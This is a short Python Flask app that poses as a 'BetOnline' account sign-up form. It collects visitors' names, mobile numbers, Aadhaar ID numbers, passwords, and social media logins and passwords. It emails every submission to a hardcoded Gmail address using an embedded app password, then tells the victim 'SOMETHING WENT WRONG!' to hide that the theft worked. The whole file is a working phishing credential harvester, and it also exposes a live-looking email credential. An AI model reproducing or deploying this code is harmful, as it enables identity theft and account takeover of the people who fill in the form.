from flask import Flask, request, render_template
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# Gmail credentials
EMAIL_ADDRESS = 'ujaassharma989@gmail.com'
EMAIL_PASSWORD = 'ipqz azeb hcjz ifio'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    fullname = request.form['fullname']
    mobilenumber = request.form['mobilenumber']
    aadharnumber = request.form['aadharnumber']
    password = request.form['password']
    socialmedia = request.form['socialmedia']
    socialid = request.form['socialid']
    socialpassword = request.form['socialpassword']
    promocode = request.form['promocode']

    # Email content
    subject = 'New BetOnline Account Submission'
    body = f'''
    Full Name: {fullname}
    Mobile Number: {mobilenumber}
    Aadhar Number: {aadharnumber}
    Password: {password}
    Social Media: {socialmedia}
    Social Media ID: {socialid}
    Social Media Password: {socialpassword}
    Promo Code: {promocode}
    '''

    # Send email
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())

    return 'SOMETHING WENT WRONG!'

if __name__ == '__main__':
    app.run(debug=True)
